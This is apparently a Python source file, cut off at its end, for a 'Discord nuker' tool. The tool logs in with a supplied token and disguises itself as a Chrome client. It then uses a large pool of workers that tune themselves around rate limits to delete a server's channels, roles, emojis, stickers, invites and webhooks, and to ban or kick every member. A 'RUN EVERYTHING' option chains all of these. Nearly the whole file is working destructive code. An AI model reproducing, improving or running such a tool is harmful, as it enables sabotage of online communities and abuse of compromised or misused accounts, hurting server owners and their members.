import asyncio
import httpx
import logging
import random
import time
import signal
import os
import sys
from collections import deque

RESET = "\033[0m"
BOLD = "\033[1m"
GRAY = "\033[90m"
WHITE = "\033[37m"
BRIGHT_RED = "\033[91m"
BRIGHT_GREEN = "\033[92m"
BRIGHT_YELLOW = "\033[93m"
BRIGHT_BLUE = "\033[94m"
BRIGHT_MAGENTA = "\033[95m"
BRIGHT_CYAN = "\033[96m"
ORANGE = "\033[38;5;208m"
PURPLE = "\033[38;5;135m"
PINK = "\033[38;5;213m"
TEAL = "\033[38;5;51m"
LIME = "\033[38;5;154m"

BASE = "https://discord.com/api/v10"
MAX_RETRIES = 5
INITIAL_WORKERS = 50
MIN_WORKERS = 10
MAX_WORKERS = 100
JITTER_MIN = 0.01
JITTER_MAX = 0.1
BACKOFF_BASE = 0.1
BACKOFF_MAX = 3.0

stats = {
    "done": 0,
    "already": 0,
    "failed": 0,
    "retries": 0,
    "rate_limits": 0,
    "start_time": 0.0,
}

_pending_tasks = set()
_interrupted = False

stats_lock = None
stop_event = None


def _safe_print(text, end="\n"):
    try:
        print(text, end=end, flush=True)
    except UnicodeEncodeError:
        try:
            print(
                text.encode("ascii", "ignore").decode("ascii"),
                end=end,
                flush=True,
            )
        except Exception:
            pass
    except Exception:
        pass


def _error_box(message):
    try:
        _safe_print("")
        _safe_print(
            f"{PURPLE}┌─ {BRIGHT_RED}{BOLD}ERROR{RESET} "
            f"{PURPLE}───────────────────────────────────────────────────┐{RESET}"
        )
        _safe_print(f"{PURPLE}│{RESET} {BRIGHT_RED}{message}{RESET}")
        _safe_print(
            f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}"
        )
        _safe_print("")
    except Exception:
        pass


def _safe_clear():
    try:
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
    except Exception:
        try:
            _safe_print("\033[2J\033[H", end="")
        except Exception:
            pass


def _safe_sleep(seconds):
    try:
        if seconds < 0:
            seconds = 0
        if seconds > 60:
            seconds = 60
        return asyncio.sleep(seconds)
    except Exception:
        return asyncio.sleep(0)


def _safe_random_uniform(a, b):
    try:
        if a > b:
            a, b = b, a
        return random.uniform(a, b)
    except Exception:
        return 0.1


def _safe_int(value, default=0):
    try:
        return int(value)
    except (ValueError, TypeError):
        return default


def _safe_float(value, default=0.0):
    try:
        return float(value)
    except (ValueError, TypeError):
        return default


def _safe_json(response):
    try:
        if response is None:
            return None
        return response.json()
    except Exception:
        return None


def _safe_get(d, key, default=None):
    try:
        if not isinstance(d, dict):
            return default
        return d.get(key, default)
    except Exception:
        return default


def _safe_len(value):
    try:
        return len(value)
    except Exception:
        return 0


def _safe_div(a, b, default=0.0):
    try:
        if b == 0:
            return default
        return a / b
    except Exception:
        return default


def _safe_max(a, b):
    try:
        return max(a, b)
    except Exception:
        return a


def _safe_min(a, b):
    try:
        return min(a, b)
    except Exception:
        return a


def _safe_input(prompt):
    try:
        return input(prompt).strip()
    except (EOFError, KeyboardInterrupt, UnicodeDecodeError):
        return ""
    except Exception:
        return ""


class _ColorFormatter(logging.Formatter):
    COLORS = {
        "DEBUG": GRAY,
        "INFO": BRIGHT_CYAN,
        "WARNING": BRIGHT_YELLOW,
        "ERROR": BRIGHT_RED,
        "CRITICAL": BRIGHT_RED,
    }

    def format(self, record):
        try:
            original_level = record.levelname
            color = self.COLORS.get(original_level, GRAY)
            level = f"{color}{BOLD}[{original_level}]{RESET}"
            ts = self.formatTime(record, self.datefmt)
            ts_colored = f"{PURPLE}{ts}{RESET}"
            msg = record.getMessage()
            if record.exc_info:
                try:
                    msg = f"{msg}\n{self.formatException(record.exc_info)}"
                except Exception:
                    pass
            return f"{ts_colored} {level} {msg}"
        except Exception:
            try:
                return str(record.msg)
            except Exception:
                return ""


_handler = logging.StreamHandler()
_handler.setFormatter(_ColorFormatter(datefmt="%H:%M:%S"))
log = logging.getLogger("nuker")
log.setLevel(logging.INFO)
log.handlers = [_handler]
log.propagate = False


def _backoff(attempt):
    try:
        exp = min(BACKOFF_BASE * (2 ** attempt), BACKOFF_MAX)
        return exp + _safe_random_uniform(JITTER_MIN, JITTER_MAX)
    except Exception:
        return 0.1


def _is_mutating(method):
    try:
        return method.upper() in ("DELETE", "PUT", "POST", "PATCH")
    except Exception:
        return False


def _track_task(coro):
    try:
        if stop_event is None or stop_event.is_set():
            return None
        try:
            loop = asyncio.get_running_loop()
        except RuntimeError:
            return None
        task = loop.create_task(coro)
        _pending_tasks.add(task)
        task.add_done_callback(_pending_tasks.discard)
        return task
    except Exception:
        return None


def _check_h2():
    try:
        import h2  # noqa: F401
        return True
    except ImportError:
        _safe_print(
            f"{BRIGHT_RED}Missing dependency: h2{RESET}\n"
            f"{BRIGHT_YELLOW}Install it with:{RESET} "
            f"{TEAL}pip install httpx[http2]{RESET}"
        )
        return False
    except Exception as e:
        try:
            _safe_print(
                f"{BRIGHT_RED}h2 import error: {type(e).__name__}{RESET}"
            )
        except Exception:
            pass
        return False


class Nuker:
    def __init__(self, token, guild_id):
        try:
            self.token = token
            self.guild_id = guild_id
            self.headers = {
                "Authorization": token,
                "Content-Type": "application/json",
                "User-Agent": (
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/134.0.0.0 Safari/537.36"
                ),
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "X-Super-Properties": (
                    "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xv"
                    "Y2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3"
                    "MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgTGlrZSBH"
                    "ZWNrbykgQ2hyb21lLzEzNC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjo"
                    "iMTM0LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIi"
                    "wiY2xpZW50X2J1aWxkX251bWJlciI6MzAwMDAwfQ=="
                ),
            }
            self.client = None
            self.queue = None
            self.cache = {"channels": None, "roles": None}
            self.user = None
            self.guild = None
            self.permissions = 0
            self.is_owner = False
            self.is_admin = False
        except Exception:
            self.token = ""
            self.guild_id = ""
            self.headers = {}
            self.client = None
            self.queue = None
            self.cache = {"channels": None, "roles": None}
            self.user = None
            self.guild = None
            self.permissions = 0
            self.is_owner = False
            self.is_admin = False

    async def __aenter__(self):
        try:
            self.queue = asyncio.Queue()
        except Exception:
            return self
        try:
            timeout = httpx.Timeout(connect=5.0, read=15.0, write=15.0, pool=5.0)
            self.client = httpx.AsyncClient(
                timeout=timeout,
                headers=self.headers,
                http2=True,
                follow_redirects=True,
            )
        except Exception:
            self.client = None
        return self

    async def __aexit__(self, *args):
        try:
            if self.client:
                await self.client.aclose()
        except Exception:
            pass

    async def validate_token(self):
        try:
            if self.client is None:
                return False
            r = await self.client.get(f"{BASE}/users/@me")
            if r.status_code == 200:
                data = _safe_json(r)
                if isinstance(data, dict):
                    self.user = data
                    return True
            return False
        except Exception:
            return False

    async def validate_guild(self):
        try:
            if self.client is None:
                return False
            r = await self.client.get(f"{BASE}/guilds/{self.guild_id}")
            if r.status_code == 200:
                data = _safe_json(r)
                if isinstance(data, dict):
                    self.guild = data
                    return True
            return False
        except Exception:
            return False

    async def validate_permissions(self):
        try:
            if not self.guild or not self.user:
                return False

            my_id = _safe_get(self.user, "id")
            if not my_id:
                return False

            if _safe_get(self.guild, "owner_id") == my_id:
                self.is_owner = True
                self.is_admin = True
                self.permissions = 0xFFFFFFFFFFFFFFFF
                return True

            try:
                r = await self.client.get(f"{BASE}/guilds/{self.guild_id}/roles")
            except Exception:
                return False

            if r is None or r.status_code != 200:
                return False

            all_roles = _safe_json(r)
            if not isinstance(all_roles, list):
                return False

            try:
                r2 = await self.client.get(
                    f"{BASE}/guilds/{self.guild_id}/members/{my_id}"
                )
            except Exception:
                return False

            if r2 is None or r2.status_code != 200:
                self.permissions = 0
                self.is_admin = False
                return True

            member = _safe_json(r2)
            if not isinstance(member, dict):
                self.permissions = 0
                self.is_admin = False
                return True

            my_roles = set(_safe_get(member, "roles", []))
            perms = 0

            for role in all_roles:
                try:
                    if not isinstance(role, dict):
                        continue
                    rid = _safe_get(role, "id")
                    if not rid:
                        continue
                    rperm = _safe_int(_safe_get(role, "permissions", 0), 0)
                    if rid == self.guild_id:
                        perms |= rperm
                    elif rid in my_roles:
                        perms |= rperm
                except Exception:
                    continue

            self.permissions = perms
            self.is_admin = bool(perms & 0x8)
            return True
        except Exception:
            return False

    async def validate_all(self):
        try:
            _safe_print("")
            _safe_print(
                f"{PURPLE}┌─ {BRIGHT_MAGENTA}{BOLD}VALIDATION{RESET} "
                f"{PURPLE}───────────────────────────────────────────────┐{RESET}"
            )

            if not self.token:
                _safe_print(f"{PURPLE}│{RESET} {BRIGHT_RED}✘ Token: REQUIRED{RESET}")
                _safe_print(f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}")
                return False

            if not await self.validate_token():
                _safe_print(f"{PURPLE}│{RESET} {BRIGHT_RED}✘ Token: INVALID{RESET}")
                _safe_print(f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}")
                return False

            if not self.user:
                _safe_print(f"{PURPLE}│{RESET} {BRIGHT_RED}✘ Token: INVALID{RESET}")
                _safe_print(f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}")
                return False

            _safe_print(
                f"{PURPLE}│{RESET} {BRIGHT_GREEN}✔ Token: {TEAL}{BOLD}"
                f"{_safe_get(self.user, 'username', 'UNKNOWN')}"
                f"#{_safe_get(self.user, 'discriminator', '0')}{RESET}"
            )

            if not self.guild_id:
                _safe_print(f"{PURPLE}│{RESET} {BRIGHT_RED}✘ Guild: REQUIRED{RESET}")
                _safe_print(f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}")
                return False

            if not await self.validate_guild():
                _safe_print(f"{PURPLE}│{RESET} {BRIGHT_RED}✘ Guild: NOT FOUND{RESET}")
                _safe_print(f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}")
                return False

            if not self.guild:
                _safe_print(f"{PURPLE}│{RESET} {BRIGHT_RED}✘ Guild: NOT FOUND{RESET}")
                _safe_print(f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}")
                return False

            _safe_print(
                f"{PURPLE}│{RESET} {BRIGHT_GREEN}✔ Guild: {TEAL}{BOLD}"
                f"{_safe_get(self.guild, 'name', 'UNKNOWN')}{RESET}"
            )

            if not await self.validate_permissions():
                _safe_print(f"{PURPLE}│{RESET} {BRIGHT_RED}✘ Permissions: COULD NOT FETCH{RESET}")
                _safe_print(f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}")
                return False

            if self.is_owner:
                _safe_print(
                    f"{PURPLE}│{RESET} {BRIGHT_GREEN}✔ Permissions: "
                    f"{TEAL}{BOLD}OWNER{RESET}"
                )
            elif self.is_admin:
                _safe_print(
                    f"{PURPLE}│{RESET} {BRIGHT_GREEN}✔ Permissions: "
                    f"{TEAL}{BOLD}ADMINISTRATOR{RESET}"
                )
            else:
                _safe_print(
                    f"{PURPLE}│{RESET} {BRIGHT_YELLOW}⚠ Permissions: "
                    f"{TEAL}{BOLD}LIMITED (0x{self.permissions:X}){RESET}"
                )

            _safe_print(f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}")
            return True
        except Exception:
            return False

    async def request(self, method, url, json=None, attempt=0):
        try:
            if stats_lock is None or stop_event is None:
                return None
            try:
                if stop_event.is_set():
                    return None
            except Exception:
                return None

            is_mutating = _is_mutating(method)

            if attempt >= MAX_RETRIES:
                if is_mutating:
                    try:
                        async with stats_lock:
                            stats["failed"] += 1
                    except Exception:
                        pass
                return None

            if self.client is None:
                return None

            try:
                r = await self.client.request(method, url, json=json)
            except httpx.ConnectTimeout:
                try:
                    async with stats_lock:
                        stats["failed"] += 1
                except Exception:
                    pass
                return None
            except (
                httpx.RequestError,
                httpx.TimeoutException,
                httpx.RemoteProtocolError,
                asyncio.TimeoutError,
            ):
                try:
                    async with stats_lock:
                        stats["retries"] += 1
                except Exception:
                    pass
                try:
                    await _safe_sleep(_backoff(attempt))
                except Exception:
                    pass
                return await self.request(method, url, json, attempt + 1)
            except Exception:
                return None

            if r is None:
                return None

            status = getattr(r, "status_code", None)
            if status is None:
                return None

            if status in (200, 201, 204):
                if is_mutating:
                    try:
                        async with stats_lock:
                            stats["done"] += 1
                    except Exception:
                        pass
                return r

            if status == 404:
                if is_mutating:
                    try:
                        async with stats_lock:
                            stats["already"] += 1
                    except Exception:
                        pass
                return r

            if status == 429:
                body = _safe_json(r) or {}
                if not isinstance(body, dict):
                    body = {}
                retry_after = _safe_float(body.get("retry_after", 1.0), 1.0)
                scope = ""
                try:
                    scope = r.headers.get("X-RateLimit-Scope", "")
                except Exception:
                    pass
                try:
                    if r.headers.get("Retry-After"):
                        retry_after = max(
                            retry_after,
                            _safe_float(r.headers["Retry-After"], retry_after),
                        )
                except Exception:
                    pass
                is_global = False
                try:
                    is_global = bool(body.get("global", False)) or scope == "global"
                except Exception:
                    pass
                try:
                    async with stats_lock:
                        stats["rate_limits"] += 1
                        stats["retries"] += 1
                except Exception:
                    pass
                sleep_time = retry_after + _safe_random_uniform(
                    JITTER_MIN, JITTER_MAX
                )
                if is_global:
                    try:
                        _safe_print(
                            f"\n{BRIGHT_YELLOW}⚠ GLOBAL RATE LIMIT "
                            f"— sleeping {sleep_time:.2f}s{RESET}"
                        )
                    except Exception:
                        pass
                try:
                    await _safe_sleep(sleep_time)
                except Exception:
                    pass
                return await self.request(method, url, json, attempt + 1)

            if status in (401, 403):
                if is_mutating:
                    try:
                        async with stats_lock:
                            stats["failed"] += 1
                    except Exception:
                        pass
                return r

            if status in (500, 502, 503, 504):
                try:
                    async with stats_lock:
                        stats["retries"] += 1
                except Exception:
                    pass
                try:
                    await _safe_sleep(_backoff(attempt))
                except Exception:
                    pass
                return await self.request(method, url, json, attempt + 1)

            if is_mutating:
                try:
                    async with stats_lock:
                        stats["failed"] += 1
                except Exception:
                    pass
            return r
        except Exception:
            return None

    async def get_channels(self):
        try:
            if self.cache["channels"] is not None:
                return self.cache["channels"]
            try:
                r = await self.request(
                    "GET", f"{BASE}/guilds/{self.guild_id}/channels"
                )
            except Exception:
                return []
            if r and r.status_code == 200:
                data = _safe_json(r)
                if isinstance(data, list):
                    self.cache["channels"] = data
                    return self.cache["channels"]
            return []
        except Exception:
            return []

    async def get_roles(self):
        try:
            if self.cache["roles"] is not None:
                return self.cache["roles"]
            try:
                r = await self.request(
                    "GET", f"{BASE}/guilds/{self.guild_id}/roles"
                )
            except Exception:
                return []
            if r and r.status_code == 200:
                data = _safe_json(r)
                if isinstance(data, list):
                    self.cache["roles"] = data
                    return self.cache["roles"]
            return []
        except Exception:
            return []

    async def iter_members(self):
        try:
            after = "0"
            consecutive_errors = 0
            MAX_CONSECUTIVE_ERRORS = 3

            while True:
                try:
                    if stop_event is None or stop_event.is_set():
                        return
                except Exception:
                    return

                try:
                    r = await self.request(
                        "GET",
                        f"{BASE}/guilds/{self.guild_id}/members"
                        f"?limit=1000&after={after}",
                    )
                except Exception:
                    consecutive_errors += 1
                    if consecutive_errors >= MAX_CONSECUTIVE_ERRORS:
                        return
                    try:
                        await _safe_sleep(_backoff(consecutive_errors))
                    except Exception:
                        return
                    continue

                if not r:
                    return

                if r.status_code == 403:
                    return

                if r.status_code == 429:
                    return

                if r.status_code not in (200, 204):
                    consecutive_errors += 1
                    if consecutive_errors >= MAX_CONSECUTIVE_ERRORS:
                        return
                    try:
                        await _safe_sleep(_backoff(consecutive_errors))
                    except Exception:
                        return
                    continue

                consecutive_errors = 0

                batch = _safe_json(r)
                if not isinstance(batch, list):
                    return

                if not batch:
                    return

                for m in batch:
                    yield m

                try:
                    last_user_id = batch[-1]["user"]["id"]
                except (KeyError, TypeError, IndexError):
                    return

                after = last_user_id
                if len(batch) < 1000:
                    return
        except Exception:
            return

    async def get_members(self):
        try:
            members = []
            async for m in self.iter_members():
                members.append(m)
            return members
        except Exception:
            return []


class WorkerPool:
    def __init__(self, nuker):
        try:
            self.nuker = nuker
            self.current_workers = INITIAL_WORKERS
            self.tasks = deque()
            self.pool_lock = asyncio.Lock()
        except Exception:
            self.nuker = nuker
            self.current_workers = INITIAL_WORKERS
            self.tasks = deque()
            self.pool_lock = None

    async def _worker(self, stagger=0.0):
        claimed = False
        try:
            if stagger > 0:
                try:
                    await _safe_sleep(stagger)
                except asyncio.CancelledError:
                    return
                except Exception:
                    pass

            while True:
                try:
                    if stop_event is None or stop_event.is_set():
                        return
                except Exception:
                    return

                claimed = False
                try:
                    method, url, payload = self.nuker.queue.get_nowait()
                    claimed = True
                except asyncio.QueueEmpty:
                    return
                except Exception:
                    return

                try:
                    await self.nuker.request(method, url, payload)
                except asyncio.CancelledError:
                    if claimed:
                        try:
                            self.nuker.queue.task_done()
                        except Exception:
                            pass
                        claimed = False
                    raise
                except Exception:
                    pass
                finally:
                    if claimed:
                        try:
                            self.nuker.queue.task_done()
                        except Exception:
                            pass
                        claimed = False
        except asyncio.CancelledError:
            raise
        except Exception:
            return

    async def start(self):
        try:
            for _ in range(self.current_workers):
                try:
                    stagger = _safe_random_uniform(0.0, 0.5)
                    try:
                        loop = asyncio.get_running_loop()
                    except RuntimeError:
                        return
                    self.tasks.append(
                        loop.create_task(self._worker(stagger=stagger))
                    )
                except Exception:
                    pass
        except Exception:
            pass

    async def autotune(self):
        try:
            last_done = 0
            last_rl = 0
            while True:
                try:
                    if stop_event is None or stop_event.is_set():
                        return
                except Exception:
                    return

                try:
                    await _safe_sleep(1)
                except asyncio.CancelledError:
                    return
                except Exception:
                    return

                try:
                    async with stats_lock:
                        done = stats["done"] - last_done
                        rl = stats["rate_limits"] - last_rl
                        last_done = stats["done"]
                        last_rl = stats["rate_limits"]
                except Exception:
                    continue

                if self.pool_lock is None:
                    continue

                try:
                    async with self.pool_lock:
                        live_tasks = deque(
                            t for t in list(self.tasks) if not t.done()
                        )
                        self.tasks = live_tasks

                        if rl > done * 0.3 and self.current_workers > MIN_WORKERS:
                            new_count = _safe_max(
                                MIN_WORKERS, int(self.current_workers * 0.7)
                            )
                            if new_count < self.current_workers:
                                excess = len(self.tasks) - new_count
                                for _ in range(_safe_max(0, excess)):
                                    try:
                                        t = self.tasks.pop()
                                        t.cancel()
                                    except Exception:
                                        pass
                                self.current_workers = new_count

                        elif (
                            rl == 0
                            and done > 20
                            and self.current_workers < MAX_WORKERS
                        ):
                            new_count = _safe_min(
                                MAX_WORKERS, self.current_workers + 10
                            )
                            to_spawn = new_count - len(self.tasks)
                            for _ in range(_safe_max(0, to_spawn)):
                                try:
                                    try:
                                        loop = asyncio.get_running_loop()
                                    except RuntimeError:
                                        break
                                    self.tasks.append(
                                        loop.create_task(
                                            self._worker(
                                                stagger=_safe_random_uniform(
                                                    0.0, 0.3
                                                )
                                            )
                                        )
                                    )
                                except Exception:
                                    pass
                            self.current_workers = new_count
                except Exception:
                    continue
        except asyncio.CancelledError:
            return
        except Exception:
            return

    async def stop(self):
        try:
            if self.pool_lock is not None:
                async with self.pool_lock:
                    tasks_snapshot = list(self.tasks)
                    self.tasks.clear()
            else:
                tasks_snapshot = list(self.tasks)
                self.tasks.clear()
        except Exception:
            tasks_snapshot = []

        for t in tasks_snapshot:
            try:
                t.cancel()
            except Exception:
                pass

        if tasks_snapshot:
            try:
                await asyncio.gather(*tasks_snapshot, return_exceptions=True)
            except Exception:
                pass


def _fmt_bar(done, total, width=30):
    try:
        if width < 0:
            width = 0
        if width > 200:
            width = 200
        if total <= 0:
            return f"{PURPLE}[{' ' * width}]{RESET}"
        done = _safe_max(0, _safe_min(done, total))
        filled = _safe_max(0, _safe_min(width, int(width * done / total)))
        pct = _safe_div(done, total, 0)
        color = (
            BRIGHT_RED
            if pct < 0.33
            else ORANGE
            if pct < 0.66
            else BRIGHT_GREEN
        )
        bar = f"{color}{'█' * filled}{PURPLE}{'░' * (width - filled)}{RESET}"
        return f"{PURPLE}[{RESET}{bar}{PURPLE}]{RESET}"
    except Exception:
        return f"{PURPLE}[{' ' * width}]{RESET}"


async def progress_reporter(total):
    try:
        last_done = 0
        last_time = time.time()
        while True:
            try:
                if stop_event is None or stop_event.is_set():
                    return
            except Exception:
                return

            try:
                await _safe_sleep(0.5)
            except asyncio.CancelledError:
                return
            except Exception:
                return

            try:
                now = time.time()
                async with stats_lock:
                    done = stats["done"]
                    already = stats["already"]
                    failed = stats["failed"]
                    retries = stats["retries"]
                    rl = stats["rate_limits"]

                total_processed = done + already
                delta = _safe_max(0, total_processed - last_done)
                dt = _safe_max(0, now - last_time)
                rate = _safe_div(delta, dt, 0)
                last_done = total_processed
                last_time = now

                settled = total_processed + failed
                bar = _fmt_bar(settled, total)
                pct = _safe_max(
                    0.0,
                    _safe_min(
                        100.0,
                        _safe_div(settled, total, 0) * 100 if total else 0,
                    ),
                )
                remaining = _safe_max(0, total - settled)
                eta = _safe_div(remaining, rate, 0)

                line = (
                    f"{bar} {BOLD}{TEAL}{pct:5.1f}%{RESET} "
                    f"{PURPLE}│{RESET} {BRIGHT_GREEN}OK {done}{RESET} "
                    f"{PURPLE}│{RESET} {GRAY}SKIP {already}{RESET} "
                    f"{PURPLE}│{RESET} {BRIGHT_RED}FAIL {failed}{RESET} "
                    f"{PURPLE}│{RESET} {BRIGHT_YELLOW}RL {rl}{RESET} "
                    f"{PURPLE}│{RESET} {LIME}RETRY {retries}{RESET} "
                    f"{PURPLE}│{RESET} {PINK}{rate:5.1f}/s{RESET} "
                    f"{PURPLE}│{RESET} {BRIGHT_BLUE}ETA {eta:5.0f}s{RESET}"
                )
                try:
                    print(f"\r{line}", end="", flush=True)
                except UnicodeEncodeError:
                    pass
                except Exception:
                    pass
            except Exception:
                continue
    except asyncio.CancelledError:
        return
    except Exception:
        return


async def delete_channels(nuker):
    try:
        if nuker.queue is None:
            return 0
        channels = await nuker.get_channels()
        if not channels:
            _error_box("No channels found")
            return 0
        categories = [c for c in channels if _safe_get(c, "type") == 4]
        others = [c for c in channels if _safe_get(c, "type") != 4]
        count = 0
        for c in others + categories:
            try:
                cid = _safe_get(c, "id")
                if not cid:
                    continue
                nuker.queue.put_nowait(
                    ("DELETE", f"{BASE}/channels/{cid}", None)
                )
                count += 1
            except Exception:
                continue
        if count == 0:
            _error_box("No channels found")
        return count
    except Exception:
        return 0


async def delete_roles(nuker):
    try:
        if nuker.queue is None:
            return 0
        roles = await nuker.get_roles()
        if not roles:
            _error_box("No roles found")
            return 0
        count = 0
        for role in roles:
            try:
                if _safe_get(role, "managed") or _safe_get(role, "id") == nuker.guild_id:
                    continue
                rid = _safe_get(role, "id")
                if not rid:
                    continue
                nuker.queue.put_nowait(
                    (
                        "DELETE",
                        f"{BASE}/guilds/{nuker.guild_id}/roles/{rid}",
                        None,
                    )
                )
                count += 1
            except Exception:
                continue
        if count == 0:
            _error_box("No roles found")
        return count
    except Exception:
        return 0


async def ban_members(nuker):
    try:
        if nuker.queue is None:
            return 0
        if not nuker.user:
            return 0
        my_id = _safe_get(nuker.user, "id")
        count = 0
        async for m in nuker.iter_members():
            try:
                uid = _safe_get(_safe_get(m, "user", {}), "id")
                if not uid:
                    continue
                if uid == my_id:
                    continue
                nuker.queue.put_nowait(
                    (
                        "PUT",
                        f"{BASE}/guilds/{nuker.guild_id}/bans/{uid}",
                        {"delete_message_seconds": 0},
                    )
                )
                count += 1
            except Exception:
                continue
        if count == 0:
            _error_box("No members found")
        return count
    except Exception:
        return 0


async def kick_members(nuker):
    try:
        if nuker.queue is None:
            return 0
        if not nuker.user:
            return 0
        my_id = _safe_get(nuker.user, "id")
        count = 0
        async for m in nuker.iter_members():
            try:
                uid = _safe_get(_safe_get(m, "user", {}), "id")
                if not uid:
                    continue
                if uid == my_id:
                    continue
                nuker.queue.put_nowait(
                    (
                        "DELETE",
                        f"{BASE}/guilds/{nuker.guild_id}/members/{uid}",
                        None,
                    )
                )
                count += 1
            except Exception:
                continue
        if count == 0:
            _error_box("No members found")
        return count
    except Exception:
        return 0


async def delete_emojis(nuker):
    try:
        if nuker.queue is None:
            return 0
        r = await nuker.request("GET", f"{BASE}/guilds/{nuker.guild_id}/emojis")
        if not r or r.status_code != 200:
            return 0
        emojis = _safe_json(r)
        if not isinstance(emojis, list) or not emojis:
            _error_box("No emojis found")
            return 0
        count = 0
        for e in emojis:
            try:
                eid = _safe_get(e, "id")
                if not eid:
                    continue
                nuker.queue.put_nowait(
                    ("DELETE", f"{BASE}/guilds/{nuker.guild_id}/emojis/{eid}", None)
                )
                count += 1
            except Exception:
                continue
        return count
    except Exception:
        return 0


async def delete_stickers(nuker):
    try:
        if nuker.queue is None:
            return 0
        r = await nuker.request("GET", f"{BASE}/guilds/{nuker.guild_id}/stickers")
        if not r or r.status_code != 200:
            return 0
        stickers = _safe_json(r)
        if not isinstance(stickers, list) or not stickers:
            _error_box("No stickers found")
            return 0
        count = 0
        for s in stickers:
            try:
                sid = _safe_get(s, "id")
                if not sid:
                    continue
                nuker.queue.put_nowait(
                    (
                        "DELETE",
                        f"{BASE}/guilds/{nuker.guild_id}/stickers/{sid}",
                        None,
                    )
                )
                count += 1
            except Exception:
                continue
        return count
    except Exception:
        return 0


async def delete_invites(nuker):
    try:
        if nuker.queue is None:
            return 0
        r = await nuker.request("GET", f"{BASE}/guilds/{nuker.guild_id}/invites")
        if not r or r.status_code != 200:
            return 0
        invites = _safe_json(r)
        if not isinstance(invites, list) or not invites:
            _error_box("No invites found")
            return 0
        count = 0
        for inv in invites:
            try:
                code = _safe_get(inv, "code")
                if not code:
                    continue
                nuker.queue.put_nowait(("DELETE", f"{BASE}/invites/{code}", None))
                count += 1
            except Exception:
                continue
        return count
    except Exception:
        return 0


async def delete_webhooks(nuker):
    try:
        if nuker.queue is None:
            return 0
        r = await nuker.request("GET", f"{BASE}/guilds/{nuker.guild_id}/webhooks")
        if not r or r.status_code != 200:
            return 0
        webhooks = _safe_json(r)
        if not isinstance(webhooks, list) or not webhooks:
            _error_box("No webhooks found")
            return 0
        count = 0
        for w in webhooks:
            try:
                wid = _safe_get(w, "id")
                if not wid:
                    continue
                nuker.queue.put_nowait(("DELETE", f"{BASE}/webhooks/{wid}", None))
                count += 1
            except Exception:
                continue
        return count
    except Exception:
        return 0


ACTIONS = {
    "1": ("Delete channels & categories", delete_channels),
    "2": ("Delete roles", delete_roles),
    "3": ("Ban all members", ban_members),
    "4": ("Kick all members", kick_members),
    "5": ("Delete emojis", delete_emojis),
    "6": ("Delete stickers", delete_stickers),
    "7": ("Delete invites", delete_invites),
    "8": ("Delete webhooks", delete_webhooks),
    "9": ("RUN EVERYTHING", None),
}


async def run_action(nuker, choice):
    try:
        if choice == "9":
            total = 0
            for key in ["1", "2", "5", "6", "7", "8", "3"]:
                _, fn = ACTIONS[key]
                try:
                    total += await fn(nuker)
                except Exception:
                    continue
            return total

        _, fn = ACTIONS[choice]
        if fn is None:
            return 0
        try:
            return await fn(nuker)
        except Exception:
            return 0
    except Exception:
        return 0


def _print_actions():
    try:
        _safe_print("")
        _safe_print(
            f"{PURPLE}┌─ {BRIGHT_MAGENTA}{BOLD}Mini Flay Discord Nuker{RESET} "
            f"{PURPLE}──────────────────────────────────────┐{RESET}"
        )
        _safe_print(f"{PURPLE}│{RESET} {TEAL}Available Actions{RESET}")
        _safe_print(
            f"{PURPLE}├──────────────────────────────────────────────────────────┤{RESET}"
        )
        for key in sorted(ACTIONS.keys(), key=lambda k: int(k)):
            name, _ = ACTIONS[key]
            if key == "9":
                _safe_print(
                    f"{PURPLE}│{RESET} {BRIGHT_RED}{BOLD}[{key}] {name}{RESET}"
                )
            else:
                _safe_print(
                    f"{PURPLE}│{RESET} {LIME}[{key}]{RESET} {WHITE}{name}{RESET}"
                )
        _safe_print(
            f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}"
        )
        _safe_print("")
    except Exception:
        pass


async def main():
    global stats_lock, stop_event

    try:
        if not _check_h2():
            return
    except Exception:
        return

    try:
        stats_lock = asyncio.Lock()
        stop_event = asyncio.Event()
    except Exception:
        return

    try:
        _pending_tasks.clear()
    except Exception:
        pass

    try:
        stats.update(
            {
                "done": 0,
                "already": 0,
                "failed": 0,
                "retries": 0,
                "rate_limits": 0,
                "start_time": 0.0,
            }
        )
    except Exception:
        pass

    try:
        _safe_clear()
    except Exception:
        pass

    try:
        _safe_print("")
        _safe_print(
            f"{PURPLE}┌─ {BRIGHT_MAGENTA}{BOLD}CONFIGURATION{RESET} "
            f"{PURPLE}────────────────────────────────────────────┐{RESET}"
        )
        token = _safe_input(
            f"{PURPLE}│{RESET} {TEAL}Token{RESET}  {PURPLE}➜{RESET} "
        )
        guild_id = _safe_input(
            f"{PURPLE}│{RESET} {TEAL}Guild{RESET}  {PURPLE}➜{RESET} "
        )
        _safe_print(
            f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}"
        )
    except Exception:
        return

    try:
        nuker = Nuker(token, guild_id)
        async with nuker:
            if nuker.queue is None:
                return

            try:
                if not await nuker.validate_all():
                    return
            except Exception:
                return

            try:
                _print_actions()
                choice = _safe_input(
                    f"  {PURPLE}➜{RESET} {BOLD}Choose an option:{RESET} "
                )
            except Exception:
                return

            if choice not in ACTIONS:
                _error_box("Invalid option")
                return

            stats["start_time"] = time.time()

            try:
                total = await run_action(nuker, choice)
            except Exception:
